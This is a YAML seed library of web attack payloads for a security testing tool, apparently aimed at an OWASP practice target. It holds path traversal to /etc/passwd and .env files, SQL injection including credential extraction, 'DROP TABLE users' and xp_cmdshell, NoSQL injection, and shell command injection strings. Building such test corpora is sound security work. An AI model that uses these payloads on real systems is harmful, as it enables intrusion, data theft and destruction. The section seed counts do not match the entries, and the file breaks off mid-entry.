# 传统 Web 安全漏洞攻击种子库 — 针对 OWASP 靶机 MM labs 后端 API 端点
# 覆盖 OWASP Top 10 (2025) 传统 Web 漏洞 + 安全评估评分点
# 与 LLM Prompt 攻击种子不同, 这些种子是原始 HTTP payload,
# 通过 {PROMPT} 占位符注入到 Burp 请求的对应位置 (path / query / body)
#
# 使用方式:
#   1. 为每个端点准备一个带 {PROMPT} 占位符的 Burp 请求文件
#   2. 将这些请求文件放在 data/burp/endpoints/ 目录下
#   3. 使用 --strategy web_vuln 执行
#
# 种子分类 (按 OWASP Top 10 2025):
#   A01: Broken Access Control (IDOR, 路径遍历, 权限绕过)
#   A02: Cryptographic Failures (弱加密, 硬编码密钥, 哈希泄露)
#   A03: Injection (SQLi, NoSQLi, Command Injection, LDAP injection, XSS)
#   A04: Insecure Design (业务逻辑漏洞, 缺少速率限制, 批量赋值)
#   A05: Security Misconfiguration (目录列表, 默认凭据, XXE)
#   A06: Vulnerable & Outdated Components (依赖漏洞, 已知CVE利用)
#   A07: Identification & Authentication Failures (弱认证, 会话固定, JWT)
#   A08: Software & Data Integrity Failures (反序列化, 签名验证缺失)
#   A09: Security Logging & Monitoring Failures (日志注入, 监控绕过)
#   A10: Server-Side Request Forgery (SSRF)
#
# LLM 相关 (OWASP LLM Top 10 2025):
#   LLM01: Prompt Injection (间接提示注入, 通过 Web 端点触发)
#   LLM02: Sensitive Information Disclosure (LLM 数据泄露)
#
# Agentic AI 相关 (OWASP Agentic AI Top 10):
#   ASI01-ASI10: 参见 evidence.py _OWASP_ASI_CATEGORIES
#
# 评分方式: SubStringScorer 检测响应中的漏洞指标 (DB 错误/数据泄露/权限提升等)

# ════════════════════════════════════════════════════════
# A01: Broken Access Control (3 seeds)
# ════════════════════════════════════════════════════════

- value: "1"
  metadata:
    owasp_id: "A01"
    vulnerability_type: "idor"
    category: "broken_access_control"
    difficulty: "easy"
    severity: "high"
    source: "web_vuln"
    language: "en"
    scoring_method: "substring"
    scoring_indicators: "email,password,ssn,credit_card,user_id,admin"
    description: "IDOR — 枚举用户 ID (递增整数), 访问其他用户数据"

- value: "0"
  metadata:
    owasp_id: "A01"
    vulnerability_type: "idor_boundary"
    category: "broken_access_control"
    difficulty: "easy"
    severity: "high"
    source: "web_vuln"
    language: "en"
    scoring_method: "substring"
    scoring_indicators: "email,password,ssn,credit_card,user_id,admin"
    description: "IDOR — 边界值测试 (user_id=0 或 admin)"

- value: "../../../etc/passwd"
  metadata:
    owasp_id: "A01"
    vulnerability_type: "path_traversal"
    category: "broken_access_control"
    difficulty: "medium"
    severity: "high"
    source: "web_vuln"
    language: "en"
    scoring_method: "substring"
    scoring_indicators: "root:x:0:0,bin:x:1:1,daemon:x:/etc/passwd"
    description: "路径遍历 — 读取系统文件 /etc/passwd"

- value: "../../app/.env"
  metadata:
    owasp_id: "A01"
    vulnerability_type: "path_traversal_env"
    category: "broken_access_control"
    difficulty: "medium"
    severity: "critical"
    source: "web_vuln"
    language: "en"
    scoring_method: "substring"
    scoring_indicators: "API_KEY,SECRET_KEY,DATABASE_URL,PASSWORD,TOKEN"
    description: "路径遍历 — 读取应用 .env 配置文件"

- value: "' OR '1'='1' --"
  metadata:
    owasp_id: "A01"
    vulnerability_type: "auth_bypass_sqli"
    category: "broken_access_control"
    difficulty: "easy"
    severity: "critical"
    source: "web_vuln"
    language: "en"
    scoring_method: "substring"
    scoring_indicators: "welcome,dashboard,admin,logged in,success,token"
    description: "认证绕过 — SQL 注入登录表单"

# ════════════════════════════════════════════════════════
# A03: Injection (8 seeds)
# ════════════════════════════════════════════════════════

- value: "' OR '1'='1' --"
  metadata:
    owasp_id: "A03"
    vulnerability_type: "sqli_classic"
    category: "injection"
    difficulty: "easy"
    severity: "critical"
    source: "web_vuln"
    language: "en"
    scoring_method: "substring"
    scoring_indicators: "user,admin,email,password,username,table,database"
    description: "SQLi — 经典 OR 1=1 注入"

- value: "' UNION SELECT NULL,username,password FROM users --"
  metadata:
    owasp_id: "A03"
    vulnerability_type: "sqli_union"
    category: "injection"
    difficulty: "medium"
    severity: "critical"
    source: "web_vuln"
    language: "en"
    scoring_method: "substring"
    scoring_indicators: "password,username,email,admin,hash"
    description: "SQLi — UNION 注入提取凭据"

- value: "1; DROP TABLE users --"
  metadata:
    owasp_id: "A03"
    vulnerability_type: "sqli_stacked"
    category: "injection"
    difficulty: "medium"
    severity: "critical"
    source: "web_vuln"
    language: "en"
    scoring_method: "substring"
    scoring_indicators: "error,deleted,dropped,success,ok"
    description: "SQLi — 堆叠查询注入"

- value: "' AND SLEEP(5) --"
  metadata:
    owasp_id: "A03"
    vulnerability_type: "sqli_blind_time"
    category: "injection"
    difficulty: "medium"
    severity: "high"
    source: "web_vuln"
    language: "en"
    scoring_method: "time_based"
    scoring_indicators: "delay"
    description: "SQLi — 时间盲注 (SLEEP)"

- value: "'; EXEC xp_cmdshell('whoami') --"
  metadata:
    owasp_id: "A03"
    vulnerability_type: "sqli_command_exec"
    category: "injection"
    difficulty: "hard"
    severity: "critical"
    source: "web_vuln"
    language: "en"
    scoring_method: "substring"
    scoring_indicators: "root,administrator,nt authority,whoami,\\"
    description: "SQLi — xp_cmdshell 命令执行"

- value: "{$gt: ''}"
  metadata:
    owasp_id: "A03"
    vulnerability_type: "nosqli_operator"
    category: "injection"
    difficulty: "medium"
    severity: "critical"
    source: "web_vuln"
    language: "en"
    scoring_method: "substring"
    scoring_indicators: "email,password,username,admin,user"
    description: "NoSQLi — MongoDB $gt 操作符注入"

- value: "; cat /etc/passwd"
  metadata:
    owasp_id: "A03"
    vulnerability_type: "command_injection"
    category: "injection"
    difficulty: "medium"
    severity: "critical"
    source: "web_vuln"
    language: "en"
    scoring_method: "substring"
    scoring_indicators: "root:x:0:0,bin:x:1:1,daemon:"
    description: "命令注入 — 分号拼接"

- value: "| id"
  metadata:
    owasp_id: "A03"
    vulnerability_type: "command_injection_pipe"
    category: "injection"
    difficulty: "medium"
    severity: "critical"
    source: "web_vuln"
    language: "en"
    scoring_method: "substring"
    scoring_indicators: "uid=,gid=,groups=,root"
    description: "命令注入 — 管道符"

- value: "$(whoami)"
  metadata:
    owasp_id: "A03"
    vulnerability_type: "command_injection_substitution"
    category: "injection"
    difficulty: "medium"
    severity: "critical"
    source: "web_vuln"
    language: "en"
    scoring_method: "substring"
    scoring_indicators: "uid=,gid=,root,www-data"
    description: "命令注入 — 命令替换 $()"

- value: "{\"$where\": \"sleep(5000)\"}"
  metadata:
    owasp_id: "A03"
    vulnerability_type: "nosqli_js_injection"
    category: "injection"
    difficulty: "hard"
    severity: "high"
    source: "web_vuln"
    language: "en"
    scoring_method: "time_based"
    scoring_indicators: "delay"
    description: "NoSQLi — $where JS 注入"

- value: "1' OR 1=1#"
  metadata:
    owasp_id: "A03"
    vulnerability_type: "sqli_mysql_comment"
    category: "injection"
    difficulty: "easy"
    severity: "critical"
    source: "web_vuln"
    language: "en"
    scoring_method: "substring"
    scoring_indicators: "user,admin,email,password,username"
    description: "SQLi — MySQL # 注释注入"

# ════════════════════════════════════════════════════════
# A04: Insecure Design (3 seeds) — 业务逻辑漏洞
# ════════════════════════════════════════════════════════

- value: "quantity=-1"
  metadata:
